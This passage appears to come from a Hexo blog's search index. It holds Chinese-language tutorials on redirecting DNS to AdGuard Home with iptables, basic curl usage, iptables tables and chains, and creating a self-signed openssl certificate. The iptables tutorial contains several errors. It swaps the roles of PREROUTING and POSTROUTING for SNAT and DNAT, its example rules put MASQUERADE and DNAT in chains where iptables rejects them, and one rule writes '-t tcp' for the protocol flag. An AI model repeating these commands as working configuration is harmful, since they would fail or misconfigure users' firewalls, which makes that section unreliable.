id="3-配置dns广告过滤以及dns加密"><a href="#3-配置dns广告过滤以及dns加密" class="headerlink" title="3.配置dns广告过滤以及dns加密"></a>3.配置dns广告过滤以及dns加密</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#54端口自行配置AdGuard_Home</span><br>iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 54<br>iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 55<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/1970/01/01/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>title: curl基本使用<br>date: 2022-05-25 20:28:39<br>tags: 软件使用<br>categories: 软件配置</p><h1 id="curl基本使用"><a href="#curl基本使用" class="headerlink" title="curl基本使用"></a>curl基本使用</h1><h3 id="1-什么是curl"><a href="#1-什么是curl" class="headerlink" title="1.什么是curl?"></a>1.什么是curl?</h3><p>curl是一个命令行工具,用于向指定的url发送请求,支持http,mqtt,ftp,rtmp,pop2,scp等各种协议</p><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --verbose www.baidu.com<br><span class="hljs-comment">#verbose 用于打开verbose,使用这个模式可以查看到发送的数据包信息</span><br>curl -A <span class="hljs-string">&quot;curl&quot;</span> www.baidu.com<br><span class="hljs-comment">#-A参数指定特定的User-Agent</span><br>curl -A <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0&quot;</span> https://www.baidu.com/index.html<br><span class="hljs-comment">#-b参数用于向服务器传输cookie,也可以指定cookie文件</span><br>curl -b <span class="hljs-string">&quot;x_key=asjdflkdjaslfdjklasjlkf&quot;</span> http://www.google.com/index.html<br><span class="hljs-comment">#-c参数用于将服务器设置的cookie写入一个文件</span><br>curl -c coookie.txt -v http://www.baidu.com/index.html<br><span class="hljs-comment">#-d,--data-urlencode参数用于发送post请求的数据</span><br>curl -d <span class="hljs-string">&quot;name=admin&amp;password=password&quot;</span> -X POST https://www.baidu.com/index.html<br><span class="hljs-comment">#-X参数用与指定发送的请求方式如Get Post</span><br><span class="hljs-comment">#-e参数用于指定refer头</span><br>curl -e <span class="hljs-string">&quot;http://www.baidu.com/index.html&quot;</span> https://www.google.com<br><span class="hljs-comment">#-F参数用于上传二进制文件</span><br>curl -F <span class="hljs-string">&#x27;file=@photo.png&#x27;</span> https://baidu.com/profile<br><span class="hljs-comment">#-F参数可以指定上传的文件的MIME类型</span><br>curl -F <span class="hljs-string">&quot;file=@photo.png;image/png&quot;</span> -X POST https://www.baidu.com/profile<br>curl -F <span class="hljs-string">&quot;file=@photo.png;filename=me.png&quot;</span> -X POST https://www.baidu.com/profile<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/iptables/"/>
    <url>/1970/01/01/iptables/</url>
    
    <content type="html"><![CDATA[<h1 id="netfilter-x2F-iptables使用"><a href="#netfilter-x2F-iptables使用" class="headerlink" title="netfilter&#x2F;iptables使用"></a>netfilter&#x2F;iptables使用</h1><h3 id="1-什么是iptables？"><a href="#1-什么是iptables？" class="headerlink" title="1.什么是iptables？"></a>1.什么是iptables？</h3><p>netfliter&#x2F;iptables是linux一个用来过滤流量以及数据包转发的内核模块</p><p>是linux内核的一部分,iptables是linux中的一个工具,运行在用户空间,可以控制netfliter中增加修改删除数据包的处理规则,netfliter位于网卡和内核之间,可以控制计算机的进出流量</p><h3 id="2-iptables的结构"><a href="#2-iptables的结构" class="headerlink" title="2.iptables的结构"></a>2.iptables的结构</h3><h4 id="4张表"><a href="#4张表" class="headerlink" title="4张表"></a>4张表</h4><ul><li><p>raw</p><p>用于赶上连接之前处理数据包,比如在数据流量大的时候,可以定义某条规则不进入跟踪链,提高iptables效率</p></li><li><p>mangle</p><p>用于修改数据包,如TOS,QOS</p></li><li><p>nat</p><p>用于数据包的网络地址转换</p></li><li><p>filter</p><p>用于数据包的过滤</p></li></ul><h4 id="多条链"><a href="#多条链" class="headerlink" title="多条链"></a>多条链</h4><ul><li><p>PREROUTING</p><p>用于路由器前转换(如源地址转换(SNAT))</p></li><li><p>INPUT</p><p>用于入站流量处理</p></li><li><p>FORWARD</p><p>用于转发流量处理</p></li><li><p>OUTPUT</p><p>用于出战流量处理</p></li><li><p>POSTROUTING</p><p>用于路由后转换(如目标地址转换(DNAT))</p></li></ul><h3 id="3-基本用法"><a href="#3-基本用法" class="headerlink" title="3.基本用法"></a>3.基本用法</h3><p>命令格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t [table] COMMAND(chains) -p [protocol] -s [<span class="hljs-built_in">source</span> ip address] -d [destination ip address] ..... -j ACTION<br>-R/I/A(修改/插入/追加)<br>-t 指定表<br>-p 指定协议（tcp/udp/icmp)<br>-s 指定源ip地址(ip/mask)<br>-d 指定目标ip地址<br>--dport 指定目标端口<br>--sport 指定源端口<br>-j 指定处理类型(DROP/REJECT/ACCEPT/REDIRECT/MASQUERADE)(丢弃,丢弃并回应,允许,重定向,伪装源ip地址)<br>-m 指定扩展类型(multiport/state)<br>--state 指定连接状态(NEW,ESTABLISHED)<br>--tcp-flags(SYN,ACK,PSH,FIN,)<br>--icmp-type(指定icmp的标志位,echo-request,echo-reply)<br>-i 指定入站网卡<br>-o 指定出战网卡<br></code></pre></td></tr></table></figure><h5 id="配置链的默认策略"><a href="#配置链的默认策略" class="headerlink" title="配置链的默认策略"></a>配置链的默认策略</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t filter -P INPUT DROP/ACCEPT<br></code></pre></td></tr></table></figure><h5 id="配置数据包过滤"><a href="#配置数据包过滤" class="headerlink" title="配置数据包过滤"></a>配置数据包过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置</span><br>iptables -t filter -I INPUT -t tcp -s 0.0.0.0/0 -d 0.0.0.0/0 --dport 80 -j DROP<br></code></pre></td></tr></table></figure><h5 id="配置nat"><a href="#配置nat" class="headerlink" title="配置nat"></a>配置nat</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置源地址转换</span><br>iptables -t nat -I PREROUTING -s 0.0.0.0/0 -d 0.0.0.0 -j MASQUERADE<br><span class="hljs-comment">#配置目标地址转换</span><br>iptables -t nat -I POSTROUTING -s 0.0.0.0/0 -d 0.0.0.0/0 -j DNAT --to-destination 192.168.50.1/24<br></code></pre></td></tr></table></figure><h5 id="配置保存iptables规则"><a href="#配置保存iptables规则" class="headerlink" title="配置保存iptables规则"></a>配置保存iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-save &gt; ./iptables.txt<br></code></pre></td></tr></table></figure><h5 id="配置导入iptables规则"><a href="#配置导入iptables规则" class="headerlink" title="配置导入iptables规则"></a>配置导入iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables-restore &lt; ./iptables.txt<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>iptable是linux中控制流量进出的非常有效的工具,在了解iptables的同时可以非常深刻的了解linux中接收流量后流量的走向。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/openssl%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6/"/>
    <url>/1970/01/01/openssl%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="openssl自签证书"><a href="#openssl自签证书" class="headerlink" title="openssl自签证书"></a>openssl自签证书</h1><p>自签证书一般有三个步骤</p><h3 id="1-生成私钥"><a href="#1-生成私钥" class="headerlink" title="1.生成私钥"></a>1.生成私钥</h3><h3 id="2-生成证书的请求信息-用于提交给ca进行签名"><a href="#2-生成证书的请求信息-用于提交给ca进行签名" class="headerlink" title="2.生成证书的请求信息,用于提交给ca进行签名"></a>2.生成证书的请求信息,用于提交给ca进行签名</h3><h3 id="3-使用私钥对证书请求信息自行签名"><a href="#3-使用私钥对证书请求信息自行签名" class="headerlink" title="3.使用私钥对证书请求信息自行签名"></a>3.使用私钥对证书请求信息自行签名</h3><h4 id="1-生成私钥-1"><a href="#1-生成私钥-1" class="headerlink" title="1.生成私钥"></a>1.生成私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -des3 -out server.key 2048<br><span class="hljs-comment">#生成rsa私钥，des3算法，2048位强度，server.key是秘钥文件名。</span><br></code></pre></td></tr></table></figure><h4 id="2-生成证书请求信息"><a href="#2-生成证书请求信息" class="headerlink" title="2.生成证书请求信息"></a>2.生成证书请求信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl req -new -key server.key -out server.csr<br></code></pre></td></tr></table></figure><h4 id="4-删除私钥的密码"><a href="#4-删除私钥的密码" class="headerlink" title="4.删除私钥的密码"></a>4.删除私钥的密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsa -<span class="hljs-keyword">in</span> server.key -out server.key<br></code></pre></td></tr></table></figure><h4 id="5-生成证书"><a href="#5-生成证书" class="headerlink" title="5.生成证书"></a>5.生成证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -req -days 365 -<span class="hljs-keyword">in</span> server.csr -signkey server.key -out server.crt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
